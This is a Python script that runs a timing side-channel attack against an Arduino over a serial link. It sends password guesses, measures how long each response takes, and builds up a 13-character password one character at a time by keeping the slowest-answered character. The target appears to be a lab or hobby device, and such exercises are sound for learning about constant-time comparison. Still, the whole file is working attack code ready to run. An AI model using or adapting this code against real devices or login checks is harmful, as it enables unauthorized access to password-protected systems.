import serial
import time
import itertools
import string
import timeit

# Configure serial connection
arduino_port = 'COM7'  # Adjust to your port, e.g., '/dev/ttyUSB0' for Linux
baud_rate = 115200
timeout_duration = .5  # Set timeout duration

charset = string.ascii_lowercase

ser = serial.Serial(arduino_port, baud_rate, timeout=timeout_duration)
time.sleep(2)


def send_data(string):
    ser.write(bytes(string + '\n', 'utf-8'))
    time.sleep(0.1)


def read_response():
    return ser.readline().decode('utf-8').strip()

# Function to send a password guess to Arduino
def send_password_guess(password_guess):
    ser.reset_input_buffer()  # Clear the serial buffer
    ser.write(f"{password_guess}\n".encode())  # Send the password guess
    return ser.read(1)  # Read the Arduino response

# Function to time how long it takes to send a password guess and get a response
def measure_response_time(password_guess, repeat=5):
    def wrapper():
        send_password_guess(password_guess)
        time.sleep(0.1)  # Small delay to stabilize the response time

    # Use timeit to get the average execution time over 'repeat' runs
    return timeit.timeit(wrapper, number=repeat) / repeat



# Function to crack the password character by character using timing differences
def crack_password(password_length):
    guessed_password = ""  # Start with an empty guessed password

    for position in range(1, password_length + 1):
        best_time = 0
        best_char = ''

        for char in charset:
            # Build the test password: correct characters + current guess + padding
            test_password = guessed_password + char + "a" * (password_length - len(guessed_password) - 1)

            ser.readline()
            passw = f"{test_password}\n".encode()
            initial = time.perf_counter()
            ser.write(passw)
            ser.read(1)
            final_time = time.perf_counter()
            interval = final_time - initial
            ser.readline()

            print(f"Trying: {test_password}, Time: {interval:.6f} seconds")

            # If this character produced the longest response time, consider it the correct one
            if interval > best_time:
                best_time = interval
                best_char = char

        # Add the best character for this position to the guessed password
        guessed_password += best_char
        print(f"Guessed so far: {guessed_password}")

    return guessed_password



try:
    #send_data('')  # Skip prompt for password
    time.sleep(2)

    print(f'Arduino says: {read_response()}')
    print(ser.in_waiting)

    password_length = 13
    cracked_password = crack_password(password_length)

    print(f"Detected password: {cracked_password}")

except serial.SerialException as e:
    print(f"Serial connection error: {e}")
finally:
    if ser.is_open:
        ser.close()
